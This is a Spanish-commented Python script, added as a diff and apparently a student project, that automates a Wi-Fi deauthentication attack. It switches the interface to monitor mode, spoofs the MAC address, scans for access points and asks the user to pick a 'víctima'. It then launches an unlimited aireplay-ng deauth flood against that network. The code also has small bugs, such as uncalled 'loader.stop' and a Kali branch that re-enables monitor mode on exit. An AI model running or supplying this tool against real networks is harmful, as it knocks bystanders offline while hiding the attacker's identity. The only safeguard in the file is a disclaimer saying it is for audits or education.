@@ -1,0 +1,560 @@
+#!/usr/bin/env python3
+import subprocess # para ejecutar comandos en bash
+import sys # para terminar el proceso del script
+from time import sleep# para usar los "sleep"
+from pathlib import Path # para verificicar si el directorio o archivo existe
+from itertools import cycle # es para crear un bucle infinito con "iteradores"
+from shutil import get_terminal_size # para ver el ancho de la terminal usada para ejecutar el script
+from threading import Thread # para dividir en "partes" o "hilos" un proceso cualquiera
+import os # para ejecutar comandos en bash
+import signal # para ejecutar cosas cuando se manda la señal ctrl + c
+from prettytable import * # para elaborar una tabla
+
+class Loader: # se hace una clase llamada "Loader"
+		# se declara una función con cuatro parametros
+		# con __init__ se heredarán los atributos de la clase al instanciar el objeto
+	def __init__(self, desc="...", end="Done!", timeout=0.1):
+		''' 
+		se declaran funciones dentro de una clase para declarar metodos para usar un objeto
+		para explicarlos les llamaré "funciones" pero son métodos
+
+		ya qué: 
+		Un método, en programación orientada a objetos es un procedimiento asociado a una clase. 
+		Un método define el comportamiento de los objetos que se crean a partir de la clase. Otra forma de decir esto
+		es que un método es una acción que un objeto es capaz de realizar.>
+		'''
+		# con "self" se refiere al objeto instanciado...
+		# "desc" será una cadena "..." que marca el "incio" por defecto
+		# "end" será una cadena "Done!" que marca el final de la animación de carga por defecto
+		
+		# se asignan los últimos tres parametros como atributos que luego serán heredados por el objeto instanciado
+		self.desc = desc
+		self.end = end
+		self.timeout = timeout
+
+		# crea un "hilo" (otra parte que deriva del proceso principal "el ejecutar el script [es el proceso principal]")
+		# y demoniza el proceso para que al terminal el proceso principal, este no termina
+		self._thread = Thread(target=self._animate, daemon=True)
+		# la animación que hara: "/ | \ -""
+		self.steps = ["/","|", "\\","-"]
+		# se define como "False" para que el proceso no de por "terminada" la animación
+		self.done = False
+
+		# se define una función que marca el inicio de la animación
+	def start(self):
+		# incia el "hilo" con el objeto instanciado
+		self._thread.start()
+		# retorna el objeto instanciado
+		return self
+
+        # se define otra función para la animación de carga
+	def _animate(self):
+	# define un bucle "for" con una función "cycle" que hará un ciclo infinito con los "frames" de la animación declarados en "self.steps"
+		for c in cycle(self.steps):
+			# hasta que "self.done" tenga un "True" va a romper el ciclo y salir del bucle
+			if self.done:
+				break
+			# si no solo continuará ejecutadose esta parte de acá
+			# imprimiendo en pantalla (el "\r" es para que no haga salto de línea sino que sobreescriba en la que ya está)
+			print(f"\r{self.desc} {c}", flush=True, end="")
+			# y el tiempo que saldrá cada frame en pantalla con "self.timeout"
+			sleep(self.timeout)
+
+		# se define otra funcion (y ultima dentro de la clase...)
+	def stop(self):
+		# define "self.done" como "True" para romper el bucle y luego...
+		self.done = True
+		# guarda el numero de "columnas" de la terminal que se esté usando, dentro de la variable "cols"
+		cols = get_terminal_size((80, 20)).columns
+		# imprime "\r" para no hacer salto de línea, concatena con " " * cols
+		print("\r" + " " * cols, end="")
+		#   el " " * cols, es para básicamente llenar toda la fila con espacios en blanco,
+		# esto por que al imprimir, por ejepmlo: "cargando..." para luego poner "Hecho"
+		# la cadena "cargando..." es más larga que "Hecho", por eso al imprimir el "Hecho" sobre el "cargando..."
+		# daría el resultado de "Hechondo..." sobreponiendo "Hecho" y "cargando..." en la misma línea,
+		# se hace esto para que los caracteres que no fueron cambiados por "Hecho" sean cambiados antes por espacios en blanco
+		# para luego sí imprimir el "Hecho"
+		print(f"\r{self.end}")
+
+
+
+def monitor(): # se hace una función llamada "monitor"
+	# revisa el sistema operativo que se esta usando para ejecutar el script
+	Syst = subprocess.check_output(["lsb_release -d | awk '{print $2}'"], shell=True, text=True).strip()
+
+	# si es Arch Linux
+	if Syst == "Arch":
+		# inicia una animación de carga
+		loader = Loader("[*] - Configuring... ", "[+] - Done :D", 0.05).start()
+		# se ejecuta el comando "ip link set %s down" en una shell (para apagar la interfaz)
+		subprocess.run(['ip link set %s down' % inface], shell=True)
+		# intercambiando el "%s" por lo que se encuentre dentro de la variable "inface"
+		subprocess.run(['macchanger -a %s > /dev/null' % inface], shell=True)
+		# se ejecuta el comando "macchanger -a %s > /dev/null" en una shell para cambiar la mac de la interfaz
+		subprocess.run(['iwconfig %s mode monitor' % inface], shell=True)
+		# se ejecuta el comando "iwconfig %s mode monitor" en una shell para cambiar el modo de la interfaz a monitor
+		subprocess.run(['ip link set %s up' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+
+	# si es Ubuntu
+	elif Syst == "Ubuntu":
+		# inicia una animación de carga
+		loader = Loader("[!] - Configuring...","[!] - Done :D",0.05).start()
+		# termina los procesos que hagan conflicto con "airmon-ng check kill"
+		subprocess.run(['airmon-ng check kill >> /dev/null'], shell=True)
+		# se ejecuta el comando "ip link set %s down" en una shell (para apagar la interfaz)
+		subprocess.run(['ip link set %s down' % inface], shell=True)
+		# intercambiando el "%s" por lo que se encuentre dentro de la variable "inface"
+		subprocess.run(['macchanger -a %s > /dev/null' % inface], shell=True)
+		# se ejecuta el comando "macchanger -a %s > /dev/null" en una shell para cambiar la mac de la interfaz
+		subprocess.run(['iwconfig %s mode monitor' % inface], shell=True)
+		# se ejecuta el comando "iwconfig %s mode monitor" en una shell para cambiar el modo de la interfaz a monitor
+		subprocess.run(['ip link set %s up' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+
+	# si es Zorin OS
+	elif Syst == "Zorin":
+		# inicia una animación de carga
+		loader = Loader("[!] - Configuring...","[!] - Done :D",0.05).start()
+		# termina los procesos que hagan conflicto con "airmon-ng check kill"
+		subprocess.run(['airmon-ng check kill >> /dev/null'], shell=True)
+		# se ejecuta el comando "ip link set %s down" en una shell (para apagar la interfaz)
+		subprocess.run(['ip link set %s down' % inface], shell=True)
+		# intercambiando el "%s" por lo que se encuentre dentro de la variable "inface"
+		subprocess.run(['macchanger -a %s > /dev/null' % inface], shell=True)
+		# se ejecuta el comando "macchanger -a %s > /dev/null" en una shell para cambiar la mac de la interfaz
+		subprocess.run(['iwconfig %s mode monitor' % inface], shell=True)
+		# se ejecuta el comando "iwconfig %s mode monitor" en una shell para cambiar el modo de la interfaz a monitor
+		subprocess.run(['ip link set %s up' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+
+	# si es Kali Linux
+	elif Syst == "Kali":
+		# inicia una animación de carga
+		loader = Loader("[!] - Configuring...","[!] - Done :D",0.05).start()
+		# termina los procesos que hagan conflicto con "airmon-ng check kill"
+		subprocess.run(['airmon-ng check kill >> /dev/null'], shell=True)
+		# se ejecuta el comando "ip link set %s down" en una shell (para apagar la interfaz)
+		subprocess.run(['ip link set %s down' % inface], shell=True)
+		# intercambiando el "%s" por lo que se encuentre dentro de la variable "inface"
+		subprocess.run(['macchanger -a %s > /dev/null' % inface], shell=True)
+		# se ejecuta el comando "macchanger -a %s > /dev/null" en una shell para cambiar la mac de la interfaz
+		subprocess.run(['iwconfig %s mode monitor' % inface], shell=True)
+		# se ejecuta el comando "iwconfig %s mode monitor" en una shell para cambiar el modo de la interfaz a monitor
+		subprocess.run(['ip link set %s up' % inface], shell=True)
+		# termina la animación
+		loader.stop
+
+	# si no concuerda con alguno de los anteriores
+	else:
+		print("\033[1;91m\n[!] - Distro no compatible...\033[0;0m\n")
+
+def managed(): # se hace una función llamada "managed"
+	# revisa el sistema operativo que se esta usando para ejecutar el script
+	Syst = subprocess.check_output(["lsb_release -d | awk '{print $2}'"], shell=True, text=True).strip()
+	
+	# si es Arch Linux
+	if Syst == "Arch":
+		# inicia una animación de carga
+		loader = Loader("[*] - Configuring... ", "[+] - Hecho :D", 0.05).start()
+		# apaga la interfaz seleccionada
+		subprocess.run(['ip link set %s down' % inface], shell=True)
+		# cambia la dirección mac a la que trae la interfaz por defecto
+		subprocess.run(['macchanger -p %s > /dev/null' % inface], shell=True)
+		# vuelve a modo "managed" la interfaz seleccionada
+		subprocess.run(['iwconfig %s mode managed' % inface], shell=True)
+		# enciende la interfaz seleccionada
+		subprocess.run(['ip link set %s up' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+
+	# si es Ubuntu
+	elif Syst == "Ubuntu":
+		# inicia una animación de carga
+		loader = Loader("[!] - Configuring...","[!] - Done :D",0.05).start()
+		# termina los procesos que hagan conflicto
+		subprocess.run(['airmon-ng check kill >> /dev/null'], shell=True)
+		# reinicia el proceso de "NetworkManager"
+		subprocess.run(['systemctl restart NetworkManager'], shell=True)
+		# apaga la interfaz seleccionada
+		subprocess.run(['ip link set %s down' % inface], shell=True)
+		# cambia la dirección mac a la que trae la interfaz por defecto
+		subprocess.run(['macchanger -p %s > /dev/null' % inface], shell=True)
+		# vuelve a modo "managed" la interfaz seleccionada
+		subprocess.run(['iwconfig %s mode managed' % inface], shell=True)
+		# enciende la interfaz seleccionada
+		subprocess.run(['ip link set %s up' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+
+	# si es Zorin OS
+	elif Syst == "Zorin":
+		# inicia una animación de carga
+		loader = Loader("[!] - Configuring...","[!] - Done :D",0.05).start()
+		# termina los procesos que hagan conflicto
+		subprocess.run(['airmon-ng check kill >> /dev/null'], shell=True)
+		# reinicia el proceso de "NetworkManager"
+		subprocess.run(['systemctl restart NetworkManager'], shell=True)
+		# apaga la interfaz seleccionada
+		subprocess.run(['ip link set %s down' % inface], shell=True)
+		# cambia la dirección mac a la que trae la interfaz por defecto
+		subprocess.run(['macchanger -p %s > /dev/null' % inface], shell=True)
+		# vuelve a modo "managed" la interfaz seleccionada
+		subprocess.run(['iwconfig %s mode managed' % inface], shell=True)
+		# enciende la interfaz seleccionada
+		subprocess.run(['ip link set %s up' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+
+	# si es Kali Linux
+	elif Syst == "Kali":
+		# inicia una animación de carga
+		loader = Loader("[!] - Configuring...","[!] - Done :D",0.05).start()
+		# termina los procesos que hagan conflicto con "airmon-ng check kill"
+		subprocess.run(['airmon-ng check kill >> /dev/null'], shell=True)
+		# se ejecuta el comando "ip link set %s down" en una shell (para apagar la interfaz)
+		subprocess.run(['ip link set %s down' % inface], shell=True)
+		# intercambiando el "%s" por lo que se encuentre dentro de la variable "inface"
+		subprocess.run(['macchanger -a %s > /dev/null' % inface], shell=True)
+		# se ejecuta el comando "macchanger -a %s > /dev/null" en una shell para cambiar la mac de la interfaz
+		subprocess.run(['iwconfig %s mode monitor' % inface], shell=True)
+		# se ejecuta el comando "iwconfig %s mode monitor" en una shell para cambiar el modo de la interfaz a monitor
+		subprocess.run(['ip link set %s up' % inface], shell=True)
+		# termina la animación
+		loader.stop
+
+	# si no concuerda con alguno de los anteriores
+	else:
+		print("\033[1;91m\n[!] - Distro no compatible...\033[0;0m\n")
+
+def scan5GHz():
+	# inicia la animación de carga
+	loader = Loader("[*] - Escaneando... ", "[+] - Hecho :D", 0.05).start()
+	# selecciona el archivo con la función "Path"
+	listao = Path("listao-01.csv")
+	# inicia un condicional que verifica "si existe el archivo" con la función "is_file()"
+	if listao.is_file(): # si sí existe
+		# elimina el archivo
+		os.remove('listao-01.csv')
+		# ejecuta el comando "aircrack-ng" para escanear las redes, con un tiempo limite de 10 segundos
+		subprocess.run(['timeout -k10 10s airodump-ng -w listao --output-format csv -b a %s >> /dev/null' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+		# procesa como datos iniciales: BSSID, Canal, ESSID
+		'''
+		ESSID
+		El ESSID (Extended Service Set ID) es el nombre de la red Wi-Fi a la que se desea acceder. 
+		Se utiliza para identificar diferentes redes inalámbricas.
+
+		BSSID
+		El BSSID es una identificación de 48 bits que se utiliza para identificar un BSS (Basic Service Set)
+		concreto dentro de un área. En las redes BSS de Infraestructura, el BSSID es la dirección MAC 
+
+		CHANNEL
+		Un canal Wi-Fi es un rango de frecuencias dentro del cual pueden comunicarse los dispositivos inalámbricos. 
+		Las frecuencias utilizadas por las redes Wi-Fi suelen dividirse en 14 canales en la banda de 2,4 GHz,
+		34 canales en la banda de 5 GHz y hasta 59 canales en la banda de 6 GHz.
+		'''
+		# en la parte de donde dice "head -%s" es en donde se selecciona el elemento correspodiente
+		# en "awk -v FS=', ' '{print $1}'" seleccionamos el elemento que es separado con un ', ' el separador es ignorado
+		# guardando solamente el elemento seleccionado
+		# con "head -%s" seleccionamos la línea en específico para guardar dentro de la variable
+		# el "%s" es intercambiado por lo que se encuentre despues del "%" al final de la string
+		# con "tail -n 1" para guardar solo lo necesario
+		bssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $1}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		channel=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $4}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		ssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $14}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		
+		# si la variable "ssid" esta vacía
+		if ssid == "":
+			# va a guardar "ESSID oculta" dentro de la variable
+			ssid = "\033[3;36mESSID oculta\033[0;0m\033[1;36m"
+		
+		# la variable "numero" es es para que empiece desde ahí la selección de los datos dentro de el archivo "listao-01.csv"
+		numero = 4
+		# la variable "w" es para el "indice" mostrado en la tabla
+		w = 0
+		# se crea un "arreglo bidimensional"
+		wea=[[0],[bssid],[channel],[ssid]]
+		# luego con un bucle se guardará lo resultante del escaneo hecho anteriormente siempre y cuando la variable "bssid" no esté vacía
+		while bssid != '':
+			# se le sumará una unidad a la variable "w"
+			w += 1
+
+			# en la parte de donde dice "head -%s" es en donde se selecciona el elemento correspodiente
+			# en "awk -v FS=', ' '{print $1}'" seleccionamos el elemento que es separado con un ', ' el separador es ignorado
+			# guardando solamente el elemento seleccionado
+			# con "head -%s" seleccionamos la línea en específico para guardar dentro de la variable
+			# el "%s" es intercambiado por lo que se encuentre despues del "%" al final de la string
+			# con "tail -n 1" para guardar solo lo necesario
+			bssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $1}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			channel=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $4}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			ssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $14}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			
+			# si la variable "bssid" está vacía
+			if bssid == "":
+				# pasa sin hacer nada...
+				# al ejecutar de nuevo el bucle el bucle se rompe
+				pass
+			else:
+				# guarda como siguiente elemento el numero dentro de "w"
+				wea[0].append(w)
+				# la bssid
+				wea[1].append(bssid)
+				# y el canal
+				wea[2].append(channel)
+				# si no tiene nombre la red es una red oculta, por lo tanto si la variable está vacía
+				if ssid == "":
+					# guardará como "ESSID oculta"
+					ssid = "\033[3;36mESSID oculta\033[0;0m\033[1;36m"
+
+				# y por ultimo la ESSID
+				wea[3].append(ssid)
+				# suma una unidad a la variable número 
+				numero += 1
+		# se crea una tabla con los campos "N#, BSSID, CHANNEL y ESSID"
+		myTable = PrettyTable(['N#','BSSID', 'CHANNEL', 'ESSID'])
+
+		# se define una variable como indice para el arreglo
+		indice = 0
+		# se inicia un bucle for en donde 
+		for i in wea[0]:
+			myTable.add_row([wea[0][indice],wea[1][indice],wea[2][indice],wea[3][indice]])
+			indice += 1
+
+		myTable.set_style(DEFAULT)
+
+		print(myTable)
+		choice = int(input("[!] - Quien será tu víctima?: "))
+		siono = input("[!] - Quieres atacar a la red %s con la BSSID: " % wea[3][choice] + wea[1][choice] + "?: ")
+		while siono != "s":
+			choice= int(input("[!] - Quien será tu víctima?: "))
+			siono = input("[!] - Quieres atacar a la red %s con la BSSID: " % wea[3][choice] + wea[1][choice] + "?: ")
+		xdd = wea[1][choice],wea[2][choice],wea[3][choice],siono
+		return xdd
+	else:
+		subprocess.run(['timeout -k10 10s airodump-ng -w listao --output-format csv -b a%s >> /dev/null' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+		bssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $1}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		channel=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $4}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		ssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $14}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		if ssid == "":
+			ssid = "\033[3;36mESSID oculta\033[0;0m\033[1;36m"
+					
+		numero = 4
+		w = 0
+		wea=[[0],[bssid],[channel],[ssid]]
+		while bssid != '':
+			w += 1
+			bssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $1}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			channel=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $4}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			ssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $14}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			if bssid == "":
+				pass
+			else:
+				wea[0].append(w)
+				wea[1].append(bssid)
+				wea[2].append(channel)
+				if ssid == "":
+					ssid = "\033[3;36mESSID oculta\033[0;0m\033[1;36m"
+					
+				wea[3].append(ssid)
+				numero += 1
+		
+		myTable = PrettyTable(['N#','BSSID', 'CHANNEL', 'ESSID']) 
+		indice = 0
+		for i in wea[0]:
+			myTable.add_row([wea[0][indice],wea[1][indice],wea[2][indice],wea[3][indice]])
+			indice += 1
+
+		myTable.set_style(DEFAULT)
+
+		print(myTable)
+		choice = int(input("[!] - Quien será tu víctima?: "))
+		siono = input("[!] - Quieres atacar a la red %s con la BSSID: " % wea[3][choice] + wea[1][choice] + "?: ")
+		while siono != "s":
+			choice= int(input("[!] - Quien será tu víctima?: "))
+			siono = input("[!] - Quieres atacar a la red %s con la BSSID: " % wea[3][choice] + wea[1][choice] + "?: ")
+		xdd = wea[1][choice],wea[2][choice],wea[3][choice],siono
+		return xdd
+
+def scan():
+	loader = Loader("[*] - Escaneando... ", "[+] - Hecho :D", 0.05).start()
+	listao = Path("listao-01.csv")
+	if listao.is_file():
+		os.remove('listao-01.csv')
+		subprocess.run(['timeout -k10 10s airodump-ng -w listao --output-format csv %s >> /dev/null' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+		bssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $1}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		channel=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $4}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		ssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $14}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		if ssid == "":
+			ssid = "\033[3;36mESSID oculta\033[0;0m\033[1;36m"
+		
+		numero = 4
+		w = 0
+		wea=[[0],[bssid],[channel],[ssid]]
+		while bssid != '':
+			w += 1
+			bssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $1}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			channel=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $4}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			ssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=', ' '{print $14}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			if bssid == "":
+				pass
+			else:
+				wea[0].append(w)
+				wea[1].append(bssid)
+				wea[2].append(channel)
+				if ssid == "":
+					ssid = "\033[3;36mESSID oculta\033[0;0m\033[1;36m"
+
+				wea[3].append(ssid)
+				numero += 1
+		
+		myTable = PrettyTable(['N#','BSSID', 'CHANNEL', 'ESSID']) 
+		indice = 0
+		for i in wea[0]:
+			myTable.add_row([wea[0][indice],wea[1][indice],wea[2][indice],wea[3][indice]])
+			indice += 1
+
+		myTable.set_style(DEFAULT)
+
+		print(myTable)
+		choice = int(input("[!] - Quien será tu víctima?: "))
+		siono = input("[!] - Quieres atacar a la red %s con la BSSID: " % wea[3][choice] + wea[1][choice] + "?: ")
+		while siono != "s":
+			choice= int(input("[!] - Quien será tu víctima?: "))
+			siono = input("[!] - Quieres atacar a la red %s con la BSSID: " % wea[3][choice] + wea[1][choice] + "?: ")
+		xdd = wea[1][choice],wea[2][choice],wea[3][choice],siono
+		return xdd
+	else:
+		subprocess.run(['timeout -k10 10 airodump-ng -w listao --output-format csv %s >> /dev/null' % inface], shell=True)
+		# termina la animación
+		loader.stop()
+		bssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $1}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		channel=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $4}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		ssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $14}'| head -%s | tail -n 1" % 3], shell=True, text=True).strip()
+		if ssid == "":
+			ssid = "\033[3;36mESSID oculta\033[0;0m\033[1;36m"
+					
+		numero = 4
+		w = 0
+		wea=[[0],[bssid],[channel],[ssid]]
+		while bssid != '':
+			w += 1
+			bssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $1}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			channel=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $4}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			ssid=subprocess.check_output(["cat listao-01.csv | awk -v FS=',' '{print $14}'| head -%s | tail -n 1" % numero], shell=True, text=True).strip()
+			if bssid == "":
+				pass
+			else:
+				wea[0].append(w)
+				wea[1].append(bssid)
+				wea[2].append(channel)
+				if ssid == "":
+					ssid = "\033[3;36mESSID oculta\033[0;0m\033[1;36m"
+					
+				wea[3].append(ssid)
+				numero += 1
+		
+		myTable = PrettyTable(['N#','BSSID', 'CHANNEL', 'ESSID']) 
+		indice = 0
+		for i in wea[0]:
+			myTable.add_row([wea[0][indice],wea[1][indice],wea[2][indice],wea[3][indice]])
+			indice += 1
+
+		myTable.set_style(DEFAULT)
+
+		print(myTable)
+		choice = int(input("[!] - Quien será tu víctima?: "))
+		siono = input("[!] - Quieres atacar a la red %s con la BSSID: " % wea[3][choice] + wea[1][choice] + "?: ")
+		while siono != "s":
+			choice= int(input("[!] - Quien será tu víctima?: "))
+			siono = input("[!] - Quieres atacar a la red %s con la BSSID: " % wea[3][choice] + wea[1][choice] + "?: ")
+		xdd = wea[1][choice],wea[2][choice],wea[3][choice],siono
+		return xdd
+def attack(siono):
+	if siono == "s":
+		loader = Loader("[*] - Configurando... ", "[+] - Hecho :D", 0.05).start()
+		iwconfig_str = str("iwconfig %s channel " % inface)
+		subprocess.run([iwconfig_str + "%s" % xdd[1]], shell=True)
+		# termina la animación
+		loader.stop()
+		print("atacando en 3...")
+		sleep(1)
+		print("2...")
+		sleep(1)
+		print("1...")
+		sleep(1)
+		print("[!] - Atacando... (ctrl + c para terminar el ataque)")
+		aireplay_str = ("aireplay-ng --deauth 0 -a %s -D --deauth-rc 1cdc " % xdd[0])
+		subprocess.run([aireplay_str + inface], shell=True)
+
+result = int(subprocess.check_output(['id -u'], shell=True, text=True))
+name = subprocess.check_output(['whoami'], shell=True, text=True)
+
+if result > 0:
+	print("\033[1;91m[!] - requiere de permisos de superusuario...\033[0;0m")
+	sys.exit()
+
+os.system("clear")
+
+adv=input("\033[1;91m[!] - USA ESTE SCRIPT SOLO PARA AUDITORÍAS O FINES EDUCATIVOS BAJO TU PROPIO RIESGO\n[!] - presiona \"Enter\" para continuar...\033[0;0m")
+if adv != '':
+	print("\033[1;91m...\033[0;0m") 
+
+os.system("clear")
+
+subprocess.run(['toilet -f pagga -F border "< Deauth_attack >:v" | lolcat'], shell=True, text=True)
+subprocess.run(["echo '[!] - por XxAlex_plosivoxX - Segundo año ITSI - Ver: 2.3.0. Now in python!!' | lolcat -a"], shell=True, text=True)
+
+wewewe = subprocess.check_output(["lsb_release -d | awk '{print $2, $3, $4}'"], shell=True, text=True).strip()
+
+print("\033[1;36m[!] - Sistema operativo: \033[1;35m" + wewewe + "\033[0;1m")
+
+subprocess.run(["ip link | grep up | awk -F ': ' '{print $2}' | grep 'w' > interfaces"], shell=True)
+print("\033[1;36m[!] - interfaces inalambricas: \033[0;0m")
+subprocess.run(["cat -n interfaces"], shell=True, text=True)
+
+
+try:
+	eleccion = str(input("\033[1;36m[+] - selecciona la interfaz: \033[0;1m"))
+except KeyboardInterrupt:
+	print("\n\033[1;91m[!] Bueh...\033[0;0m")
+	sys.exit()
+
+def signal_handler(signal, frame):
+	print("\n[!] - Saliendo...")
+	monitor_enabled = subprocess.check_output(["iwconfig 2>&1 | grep 'Mode:Monitor'"], shell=True)
+	if monitor_enabled != "":
+		managed()
+	sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+
+if eleccion != "":
+	inface = subprocess.check_output(['awk "NR==%s" interfaces' % eleccion], shell=True, text=True).strip()
+	if inface == "":
+		print("\033[1;91m\n[!] - tampoco algo que no exista wn...\033[1;0m")
+		sys.exit()
+
+print("\033[1;36m[+] - interfaz seleccionada: " + inface + "\033[0;1m")
+print("\033[1;36m[-] - convirtiendo a modo monitor la interfaz " + inface + "...")
+
+monitor()
+siono = input("[?] - Quieres escanear redes de 5Ghz de frecuencia? (s/n): ")
+if siono == "s":
+	xdd = scan5GHz()
+elif siono == "n":
+	xdd = scan()
+else:
+	print("\033[1;91m\n[!] - eleccion no válida...\033[0;0m")
+	managed()
+	sys.exit()
+
+attack(xdd[3])
